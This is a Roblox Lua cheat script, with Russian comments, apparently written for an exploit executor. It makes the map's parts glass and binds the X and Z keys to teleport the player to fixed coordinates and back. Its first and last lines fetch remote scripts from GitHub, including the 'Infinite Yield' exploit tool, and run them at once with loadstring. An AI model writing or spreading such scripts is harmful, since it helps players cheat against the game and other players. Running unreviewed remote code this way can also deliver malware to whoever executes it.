loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
local function setMaterial(part)
    part.Material = Enum.Material.Glass
end

local function applyMaterialToChildren(parent)
    for _, child in ipairs(parent:GetChildren()) do
        if child:IsA("BasePart") then
            setMaterial(child)
        end
        applyMaterialToChildren(child)
    end
end

applyMaterialToChildren(game.Workspace.Map)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Исходные координаты игрока
local originalPosition = character.HumanoidRootPart.Position

-- Координаты для телепортации
local teleportPosition = Vector3.new(1562, 407, 22495)

-- Функция телепортации на заданные координаты
local function teleportToCoordinates()
    character:SetPrimaryPartCFrame(CFrame.new(teleportPosition))
end

-- Функция возвращения на исходное место
local function returnToOriginalPosition()
    character:SetPrimaryPartCFrame(CFrame.new(originalPosition))
end

-- Обработка нажатий клавиш на клавиатуре
game:GetService("UserInputService").InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.X then
        teleportToCoordinates()
    elseif input.KeyCode == Enum.KeyCode.Z then
        returnToOriginalPosition()
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/pwrsk/tsballinone/main/tsballinone"))()
